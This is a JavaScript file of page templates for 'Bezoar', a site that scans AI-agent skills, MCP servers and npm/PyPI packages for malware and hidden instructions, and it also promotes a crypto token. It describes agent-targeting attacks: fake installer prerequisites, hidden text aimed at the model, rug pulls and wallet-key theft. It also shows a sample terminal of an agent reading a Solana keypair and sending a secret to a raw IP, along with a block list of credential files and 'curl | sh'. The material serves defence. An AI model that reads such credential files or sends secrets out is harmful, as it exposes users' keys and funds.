const SRC = {
  trend: "https://www.trendmicro.com/en/research/26/b/openclaw-skills-used-to-distribute-atomic-macos-stealer.html",
  island: "https://www.island.io/blog/agentbaiting-how-800-fake-ai-skills-and-mcp-servers-delivered-malware",
  knostic: "https://www.knostic.ai/blog/when-auto-signing-sends-your-wallet-private-key-to-a-remote-server-a-malicious-mcp-package-on-npm",
  ghsa: "https://github.com/advisories/GHSA-7fjp-p82r-q2c2",
};

const tokenStrip = `
<section class="tight dark" data-needs-ca>
  <div class="wrap two">
    <div><div class="eyebrow">$BEZOAR on Robinhood Chain</div><h2>The token behind the scanner</h2><p class="muted">Scanning stays free for everyone. Holding unlocks continuous monitoring and higher API quotas when they ship. Nothing else is promised.</p></div>
    <div><div class="ca-row"><span class="ca" data-ca>{CA}</span><button class="btn" data-copy="ca">Copy</button></div><div class="actions"><a class="btn" data-link="pons" href="#" rel="noopener">Pons</a><a class="btn" data-link="explorer" href="#" rel="noopener">Blockscout</a><a class="btn" href="/token/">Details</a></div></div>
  </div>
</section>`;

export const pages = [
  {
    route: "/",
    title: "Bezoar — security for AI agents",
    desc: "Check every skill, MCP server and npm or PyPI package before your AI agent installs it. Evidence line by line. Free, no wallet.",
    scripts: ["home"],
    body: `
<section class="hero grid-bg">
  <div class="wrap">
    <div class="eyebrow">Security for AI agents</div>
    <h1>Check every skill before your agent installs it.</h1>
    <p class="lead">Skills, MCP servers and npm or PyPI packages, scanned for hidden instructions and private key theft. Every verdict comes with the exact lines that caused it.</p>
    <form id="scan-form" class="scan-box" autocomplete="off">
      <label for="scan-input" class="hidden">Target</label>
      <textarea id="scan-input" rows="1" spellcheck="false" placeholder="Paste a skill, MCP server, npm/PyPI package or GitHub URL"></textarea>
      <button type="submit">Scan</button>
    </form>
    <div class="progress"><div></div></div>
    <div class="scan-hint">Examples: <span class="mono">npm:@playwright/mcp</span> · <span class="mono">pypi:mcp-server-fetch</span> · <span class="mono">https://github.com/owner/repo</span> · or paste the text of a SKILL.md. Free, no wallet.</div>
    <div class="chips" id="chips"><span class="label">Try:</span></div>
    <div id="scan-result" class="card verdict-card hidden" aria-live="polite"></div>
  </div>
</section>

<section class="rule-top">
  <div class="wrap">
    <div class="eyebrow">What it catches</div>
    <h2>Six ways a skill turns on you</h2>
    <p class="lead">Each of these happened in public registries in 2026. Bezoar looks for the patterns, not the names.</p>
    <div class="tiles">
      <div class="tile"><span class="tag v-red">Key theft</span><p>A private key or seed leaves your machine inside a request.</p><div class="ex">gadgethumans-mcp 1.0.9 sent the wallet key in a request header. <a href="${SRC.knostic}" rel="noopener" target="_blank">Knostic</a> · <a href="/?q=npm%3Agadgethumans-mcp%401.0.9">Scan it</a></div></div>
      <div class="tile"><span class="tag v-red">Exfiltration</span><p>Data posted to Discord webhooks, Telegram bots, paste sites or raw IP addresses.</p><div class="ex">Rule NET-001</div></div>
      <div class="tile"><span class="tag v-red">Hidden instructions</span><p>Text the model reads but you never see: invisible Unicode, HTML comments, tool descriptions.</p><div class="ex">Rules HID-001…005, SHD-001</div></div>
      <div class="tile"><span class="tag v-amber">Fake installer</span><p>A "prerequisite" that is really a stealer, often installed by the agent itself.</p><div class="ex">OpenClaw skills shipped a fake OpenClawCLI. <a href="${SRC.trend}" rel="noopener" target="_blank">Trend Micro</a></div></div>
      <div class="tile"><span class="tag v-amber">Rug pull</span><p>An MCP server changes its tool definitions after you approved it.</p><div class="ex">Pinned by hash on every scan</div></div>
      <div class="tile"><span class="tag v-amber">Suspicious</span><p>Install-time scripts, decode-and-execute, look-alike package names.</p><div class="ex">Rules EXE, OBF, TYP</div></div>
    </div>
  </div>
</section>

<section class="dark grid-bg">
  <div class="wrap">
    <div class="eyebrow">How it works</div>
    <h2>Instant verdict first. AI second.</h2>
    <div class="steps">
      <div class="step"><h3>Fetch and unpack</h3><p class="muted">The exact tarball, wheel, repo or tool list your agent would get. Hashed with sha256.</p></div>
      <div class="step"><h3>Run <span data-rules>the</span> rules</h3><p class="muted">Deterministic checks for key theft, exfiltration, hidden text and fake installers. The verdict appears in about a second.</p></div>
      <div class="step"><h3>AI review</h3><p class="muted">A real language model reads the flagged code and says whether it agrees. It never replaces the evidence.</p></div>
    </div>
  </div>
</section>

<section>
  <div class="wrap">
    <div class="two">
      <div><div class="eyebrow">Live feed</div><h2>Latest scans</h2><p class="muted">The crawler checks new MCP servers and agent packages every 30 minutes.</p><a class="btn" href="/feed/">Open the feed</a></div>
      <ul class="feed-list" id="feed-preview"><li><span class="muted">Loading…</span></li></ul>
    </div>
  </div>
</section>

<section class="rule-top">
  <div class="wrap two">
    <div><div class="eyebrow">Guard · in testing</div><h2>Stop the read before it happens</h2><p class="muted">A local guard for Cursor and Claude Code that blocks agents from reading wallet files, seed phrases and .env secrets, and from sending them out. It will be published as an npx package. Until then there is nothing to install.</p><a class="btn" href="/guard/">How the guard works</a></div>
    <div class="term"><span class="c"># planned behaviour</span>
agent  read  ~/.config/solana/id.json
<span class="r">bezoar blocked</span>  wallet keypair · rule GUARD-KEY
agent  fetch https://198.51.100.7/c
<span class="r">bezoar blocked</span>  raw IP egress with secret in body</div>
  </div>
</section>

<section class="rule-top">
  <div class="wrap story">
    <img src="/brand/mark-ink.svg" alt="" width="200" height="155">
    <div><div class="eyebrow">The name</div><h2>Kings dropped a bezoar into the cup</h2><p class="lead">A bezoar is a stone once believed to neutralize any poison. Royal courts dropped it into wine before the king drank. Your agent drinks from public registries all day. Bezoar goes into the cup first.</p></div>
  </div>
</section>
${tokenStrip}`,
  },
  {
    route: "/scan/",
    title: "Scan report · Bezoar",
    desc: "A Bezoar scan report: verdict, evidence lines and AI review.",
    scripts: ["report"],
    body: `
<section class="tight">
  <div class="wrap">
    <div class="eyebrow">Scan report</div>
    <div id="report" class="card verdict-card"><p class="muted">Loading report…</p></div>
    <div id="report-tools" class="hidden"></div>
    <p class="small muted" style="margin-top:28px">Think a verdict is wrong? <a data-link="dispute" href="#" rel="noopener">Open a dispute</a> with the report link. See <a href="/docs/#limits">limits</a>.</p>
  </div>
</section>`,
  },
  {
    route: "/feed/",
    title: "Live feed · Bezoar",
    desc: "Every skill, MCP server and agent package Bezoar scanned, newest first. Filter by verdict and registry.",
    scripts: ["feed"],
    body: `
<div class="page-head grid-bg"><div class="wrap"><div class="eyebrow">Live feed</div><h1>What the crawler and users scanned</h1><p class="lead">New MCP servers from the official registry, fresh npm and PyPI agent packages, and every public user scan. Newest first.</p></div></div>
<section class="tight">
  <div class="wrap">
    <div class="counters">
      <div><b data-stat="scannedToday">—</b><span>scanned today</span></div>
      <div><b data-stat="flaggedToday">—</b><span>flagged today</span></div>
      <div><b data-stat="keyTheftAllTime">—</b><span>key theft, all time</span></div>
      <div><b data-stat="totalScans">—</b><span>total scans</span></div>
    </div>
    <div class="filters">
      <select id="f-verdict" aria-label="Verdict"><option value="">All verdicts</option><option>KEY THEFT</option><option>EXFILTRATION</option><option>HIDDEN INSTRUCTIONS</option><option>FAKE INSTALLER</option><option>RUG PULL</option><option>SUSPICIOUS</option><option>INCOMPLETE</option><option>NO FINDINGS</option></select>
      <select id="f-registry" aria-label="Registry"><option value="">All sources</option><option>npm</option><option>PyPI</option><option>GitHub</option><option>MCP server</option><option>File</option><option>Web page</option><option>Pasted text</option></select>
      <label class="small"><input type="checkbox" id="f-flagged"> Flagged only</label>
      <span class="small muted" style="margin-left:auto"><a href="/feed.xml">RSS</a> · <a href="/api/v1/feed?flagged=1">JSON</a></span>
    </div>
    <p class="small muted" id="crawl-state" style="margin:16px 0"></p>
    <ul class="feed-list" id="feed"></ul>
    <div class="actions"><button class="btn hidden" id="more">Load more</button></div>
  </div>
</section>`,
  },
  {
    route: "/guard/",
    title: "Guard · Bezoar",
    desc: "A local guard for Cursor and Claude Code that blocks agents from reading wallet keys and secrets. In testing.",
    body: `
<div class="page-head grid-bg"><div class="wrap"><div class="eyebrow">Guard · <span class="status-test">In testing</span></div><h1>Stop the read before it happens</h1><p class="lead">Scanning catches known patterns. The guard runs on your machine and refuses the dangerous action itself, whatever package asked for it.</p></div></div>
<section class="tight">
  <div class="wrap prose">
    <div class="notice">The guard is not published yet, so there is no install command on this page. When it ships it will appear here and on <a href="/status/">Status</a> with a link to npm and the source.</div>
    <h2>What it will block</h2>
    <table class="data">
      <thead><tr><th>Action</th><th>Examples</th><th>Default</th></tr></thead>
      <tbody>
        <tr><td>Reading wallet keys</td><td><code>~/.config/solana/id.json</code>, Ethereum keystores, browser wallet extension folders, <code>wallet.dat</code></td><td>Block, ask you</td></tr>
        <tr><td>Reading secrets</td><td><code>.env</code>, <code>~/.ssh/id_*</code>, <code>~/.aws/credentials</code>, <code>.npmrc</code></td><td>Block, ask you</td></tr>
        <tr><td>Seed phrases</td><td>12 or 24 BIP39 words in a tool argument or outgoing request</td><td>Block</td></tr>
        <tr><td>Secrets leaving</td><td>A secret value in a request to a host you have not allowed</td><td>Block</td></tr>
        <tr><td>Piped installers</td><td><code>curl … | sh</code> from hosts that are not well-known installers</td><td>Ask you</td></tr>
        <tr><td>MCP rug pulls</td><td>Tool definitions that changed since you approved them</td><td>Warn and pause the server</td></tr>
      </tbody>
    </table>
    <h2>Where it hooks in</h2>
    <ul>
      <li><b>Cursor:</b> <code>hooks.json</code> (before shell, file read and MCP calls).</li>
      <li><b>Claude Code:</b> <code>PreToolUse</code> hooks.</li>
      <li><b>Codex:</b> planned.</li>
    </ul>
    <h2>Privacy</h2>
    <p>Everything runs locally. Decisions are logged to a file on your machine. No telemetry by default. Nothing leaves your machine unless you ask Bezoar to scan a package.</p>
  </div>
</section>`,
  },
  {
    route: "/canary/",
    title: "Canary wallets · Bezoar",
    desc: "Planned: run suspicious packages with a real, nearly empty wallet key and publish the sweep transaction as proof of theft.",
    body: `
<div class="page-head grid-bg"><div class="wrap"><div class="eyebrow">Canary wallets · <span class="status-plan">Planned</span></div><h1>Proof of theft, on chain</h1><p class="lead">Static rules can be argued with. A stolen key that gets swept cannot.</p></div></div>
<section class="tight">
  <div class="wrap prose">
    <div class="notice gray">This program is not live. No canary wallets exist yet, so none are listed. When it starts, the wallets, balances and every sweep will appear here with transaction links.</div>
    <h2>How it will work</h2>
    <ol>
      <li>A package flagged as suspicious is installed and run in an isolated sandbox with no access to anything real.</li>
      <li>The sandbox holds a real private key for a wallet with a tiny balance, placed where stealers look: <code>id.json</code>, a <code>.env</code> file, a browser wallet folder.</li>
      <li>If the key leaves the sandbox and the wallet is swept, the sweep transaction is public, permanent proof. The report links it.</li>
    </ol>
    <h2>Why it matters</h2>
    <p>It turns "this code looks bad" into "this code stole a key on this date, here is the transaction". That is evidence a registry, a journalist or an affected developer can act on.</p>
  </div>
</section>`,
  },
  {
    route: "/registry/",
    title: "Onchain registry · Bezoar",
    desc: "Planned: Bezoar verdict hashes sealed on Robinhood Chain so anyone can verify a report was not changed after the fact.",
    body: `
<div class="page-head grid-bg"><div class="wrap"><div class="eyebrow">Registry · <span class="status-plan">Planned</span></div><h1>Verdicts you can verify</h1><p class="lead">Each batch of reports will be hashed into a Merkle root and written to a verified contract on Robinhood Chain. Anyone can check a report against the chain in the browser.</p></div></div>
<section class="tight">
  <div class="wrap prose">
    <div class="notice gray">The registry contract is not deployed yet. There is no address, no seal history and no verifier on this page until it is. The <a href="/status/">Status</a> page will switch to Live with the contract link.</div>
    <h2>What will be sealed</h2>
    <ul>
      <li>For every report: id, target, artifact sha256, verdict, rule ids and time, as one canonical JSON leaf hashed with keccak256.</li>
      <li>Leaves are batched every hour into a sorted-pair Merkle root written to the contract.</li>
      <li>The contract source will be verified on Sourcify (exact match) and linked here with Blockscout.</li>
    </ul>
    <h2>What it proves</h2>
    <p>That a verdict existed at a given time and was not edited later. It does not prove the verdict is right. That is what the evidence lines are for.</p>
    <h2>Why on chain at all</h2>
    <p>A public blocklist that other agents and tools can read without trusting our server. Missed hours will stay visibly missed.</p>
  </div>
</section>`,
  },
  {
    route: "/docs/",
    title: "Docs · Bezoar",
    desc: "Bezoar API, MCP endpoint, verdicts, rules catalog and limits.",
    scripts: ["docs"],
    body: `
<div class="page-head grid-bg"><div class="wrap"><div class="eyebrow">Docs</div><h1>API, MCP and rules</h1><p class="lead">Everything the site does is available to your own agents and scripts. No key needed for normal use.</p></div></div>
<section class="tight">
  <div class="wrap docs-grid">
    <nav class="toc"><a href="#api">REST API</a><a href="#mcp">MCP</a><a href="#verdicts">Verdicts</a><a href="#rules">Rules catalog</a><a href="#limits">Limits</a></nav>
    <div class="prose">
      <h2 id="api" style="margin-top:0">REST API</h2>
      <p>Base URL is this site. Responses are JSON. Scans are limited to 30 per 10 minutes per IP address; AI reviews to 20.</p>
      <div class="term" data-origin>curl -s -X POST {origin}/api/v1/scan \\
  -H 'content-type: application/json' \\
  -d '{"target":"npm:@playwright/mcp"}'</div>
      <table class="data" style="margin-top:20px">
        <thead><tr><th>Endpoint</th><th>What it returns</th></tr></thead>
        <tbody>
          <tr><td><code>POST /api/v1/scan</code></td><td><code>{"target": …, "rescan": false}</code> returns the report: <code>id, verdict, findings[], rulesChecked, filesScanned, incomplete[], sha256</code>. Same target within 10 minutes returns the cached report.</td></tr>
          <tr><td><code>GET /api/v1/scan/:id</code></td><td>A stored report.</td></tr>
          <tr><td><code>GET /api/v1/scan/:id/review</code></td><td>AI second opinion. Streams plain text the first time, JSON afterwards.</td></tr>
          <tr><td><code>GET /api/v1/feed</code></td><td>Recent scans. Params: <code>verdict, registry, flagged=1, cursor, limit</code>.</td></tr>
          <tr><td><code>GET /api/v1/rules</code></td><td>The rule catalog below.</td></tr>
          <tr><td><code>GET /api/v1/badge/:id.svg</code></td><td>A README badge for a report.</td></tr>
          <tr><td><code>GET /api/v1/health</code></td><td>Version, rule count, AI model, crawler state.</td></tr>
        </tbody>
      </table>
      <h3>Accepted targets</h3>
      <ul>
        <li><code>npm:name</code>, <code>npm:name@1.2.3</code>, or an npmjs.com URL</li>
        <li><code>pypi:name</code>, <code>pypi:name==1.2.3</code>, or a pypi.org URL</li>
        <li>A GitHub repo, branch or folder URL, or a link to a single file</li>
        <li>A remote MCP server URL (Streamable HTTP). Bezoar reads its tools, prompts and instructions.</li>
        <li>Any skill page URL, or the pasted text of a SKILL.md, tool description or install command</li>
      </ul>

      <h2 id="mcp">MCP</h2>
      <p>Give your agent the scanner itself, so it checks before it installs.</p>
      <div class="term" data-origin>{
  "mcpServers": {
    "bezoar": { "url": "{origin}/mcp" }
  }
}</div>
      <p style="margin-top:16px">Tools: <code>scan_target</code>, <code>get_report</code>, <code>search_feed</code>, <code>check_install_command</code>. The same JSON works in Cursor (<code>~/.cursor/mcp.json</code>) and Claude Code (<code>claude mcp add --transport http bezoar …/mcp</code>).</p>

      <h2 id="verdicts">Verdicts</h2>
      <table class="data">
        <thead><tr><th>Verdict</th><th>Meaning</th></tr></thead>
        <tbody>
          <tr><td><span class="tag v-red">Key theft</span></td><td>A key, seed or secret is read and sent out, or browser wallet data is read next to network code.</td></tr>
          <tr><td><span class="tag v-red">Exfiltration</span></td><td>Talks to hosts typically used to collect stolen data.</td></tr>
          <tr><td><span class="tag v-red">Hidden instructions</span></td><td>Text aimed at the model that the user does not see.</td></tr>
          <tr><td><span class="tag v-amber">Fake installer</span></td><td>Asks to download and run something outside normal package managers.</td></tr>
          <tr><td><span class="tag v-amber">Rug pull</span></td><td>MCP tool definitions changed since the first scan.</td></tr>
          <tr><td><span class="tag v-amber">Suspicious</span></td><td>Medium-severity patterns worth a human look.</td></tr>
          <tr><td><span class="tag v-gray">Incomplete</span></td><td>Something could not be fetched or read. Never treat it as clean.</td></tr>
          <tr><td><span class="tag v-green">No findings</span></td><td>No rule above low severity matched. Not a guarantee.</td></tr>
        </tbody>
      </table>

      <h2 id="rules">Rules catalog</h2>
      <div id="rules-table"><p class="muted">Loading…</p></div>

      <h2 id="limits">Limits</h2>
      <ul>
        <li><b>Pattern matching has blind spots.</b> Code written to evade rules, or payloads fetched only at runtime, can pass. The AI review helps, but is not a sandbox.</li>
        <li><b>Cloaking.</b> An MCP server can show Bezoar different tools than it shows your client.</li>
        <li><b>Size caps.</b> Archives over 15 MB, more than 4,000 files, or single files over 1 MB are skipped and the report says so.</li>
        <li><b>Private sources</b> (private repos, authenticated MCP servers) cannot be read.</li>
        <li><b>JavaScript-rendered pages</b> may expose little text. Paste the raw SKILL.md instead.</li>
        <li><b>False positives</b> happen. Each rule lists its known ones. Dispute a verdict with the report link.</li>
      </ul>
    </div>
  </div>
</section>`,
  },
  {
    route: "/token/",
    title: "$BEZOAR · Bezoar",
    desc: "The $BEZOAR token on Robinhood Chain: contract address and what holding actually unlocks.",
    body: `
<div class="page-head grid-bg"><div class="wrap"><div class="eyebrow">$BEZOAR</div><h1>The token, plainly</h1><p class="lead">Scanning, the feed, reports, docs and the API stay free without a wallet. The token is for people who want more of it.</p></div></div>
<section class="tight">
  <div class="wrap prose">
    <div class="notice gray" data-no-ca>Token not launched yet. The contract address will appear here and in the footer at launch.</div>
    <div data-needs-ca class="hidden">
      <h2 style="margin-top:0">Contract</h2>
      <div class="ca-row"><span class="ca" data-ca>{CA}</span><button class="btn" data-copy="ca">Copy</button></div>
      <div class="actions"><a class="btn" data-link="pons" href="#" rel="noopener">Pons</a><a class="btn" data-link="explorer" href="#" rel="noopener">Blockscout</a></div>
      <p class="small muted">Robinhood Chain · chain id 4663</p>
    </div>
    <h2>What holding unlocks</h2>
    <table class="data">
      <thead><tr><th>Claim</th><th>Status</th></tr></thead>
      <tbody>
        <tr><td>Unlimited public scans, feed and reports for everyone</td><td><span class="status-live">Live</span> · no token needed</td></tr>
        <tr><td>Continuous monitoring of your installed skills and MCP servers, with rug-pull alerts</td><td><span class="status-plan">Planned</span></td></tr>
        <tr><td>Higher API and MCP quotas for bots and teams</td><td><span class="status-plan">Planned</span></td></tr>
        <tr><td>Buybacks, burns or revenue share</td><td>Not offered. If a contract ever does this, it will be linked here.</td></tr>
      </tbody>
    </table>
    <h2>How holder perks will be linked</h2>
    <p>You sign a message with your wallet (a signature, not a transaction) to link it to your API key or alert channel. Pasting someone else's address unlocks nothing.</p>
  </div>
</section>`,
  },
  {
    route: "/status/",
    title: "Status · Bezoar",
    desc: "What is live, in testing and planned at Bezoar, with proof links.",
    scripts: ["status"],
    body: `
<div class="page-head grid-bg"><div class="wrap"><div class="eyebrow">Status</div><h1>What is live, exactly</h1><p class="lead">Checked from your browser right now. Nothing on this site is described as working unless it shows Live here.</p></div></div>
<section class="tight">
  <div class="wrap">
    <p class="small muted" id="api-state">Checking…</p>
    <table class="data"><thead><tr><th>Feature</th><th>Status</th><th>Proof</th></tr></thead><tbody id="status-rows"><tr><td colspan="3" class="muted">Loading…</td></tr></tbody></table>
    <h2 style="margin-top:56px">Changelog</h2>
    <table class="data"><tbody>
      <tr><td class="mono small" style="width:130px">2026-11-23</td><td>v0.1.0: scanner for npm, PyPI, GitHub, skill URLs, MCP servers and pasted text. 20 rules. AI review. Feed crawler for MCP Registry, npm and PyPI. MCP endpoint. README badges.</td></tr>
    </tbody></table>
  </div>
</section>`,
  },
  {
    route: "/about/",
    title: "About · Bezoar",
    desc: "Why Bezoar exists: AI agents now install their own tools, and attackers followed them there.",
    body: `
<div class="page-head grid-bg"><div class="wrap"><div class="eyebrow">About</div><h1>Agents install their own tools now</h1><p class="lead">That changed who gets fooled. In 2026, malware stopped tricking people and started tricking the agents that act for them.</p></div></div>
<section class="tight">
  <div class="wrap prose">
    <h2 style="margin-top:0">What happened</h2>
    <ul>
      <li>Hundreds of OpenClaw skills on ClawHub and SkillsMP told agents to install a fake "OpenClawCLI" prerequisite that delivered the Atomic stealer. <a href="${SRC.trend}" rel="noopener" target="_blank">Trend Micro</a></li>
      <li>More than 800 fake skill and MCP repositories were found, and coding agents surfaced them without being given a link. <a href="${SRC.island}" rel="noopener" target="_blank">Island</a></li>
      <li>An npm MCP package for "auto-signing" payments copied the wallet private key into an HTTP header. <a href="${SRC.knostic}" rel="noopener" target="_blank">Knostic</a></li>
      <li>A PyPI wallet MCP package exfiltrated Solana private keys during setup. <a href="${SRC.ghsa}" rel="noopener" target="_blank">GHSA-7fjp-p82r-q2c2</a></li>
    </ul>
    <h2>What Bezoar does about it</h2>
    <p>It reads what your agent is about to install, the same bytes, and shows you the lines that matter. It keeps a public record of what it finds. It never calls anything safe.</p>
    <h2>The name</h2>
    <p>A bezoar is a stone from the stomach of a mountain goat, long believed to neutralize poison. Royal courts dropped one into the cup before the king drank. Bezoar goes into the cup before your agent drinks.</p>
    <h2>Contact</h2>
    <p>Disputes and reports: <a data-link="github" href="#" rel="noopener">GitHub issues</a> · <a data-link="x" href="#" rel="noopener">X</a>.</p>
  </div>
</section>`,
  },
  {
    route: "/404",
    title: "Not found · Bezoar",
    desc: "Page not found.",
    body: `<section class="hero grid-bg"><div class="wrap"><div class="eyebrow">404</div><h1>Nothing in this cup.</h1><p class="lead">The page does not exist. <a href="/">Scan something</a> instead.</p></div></section>`,
  },
];
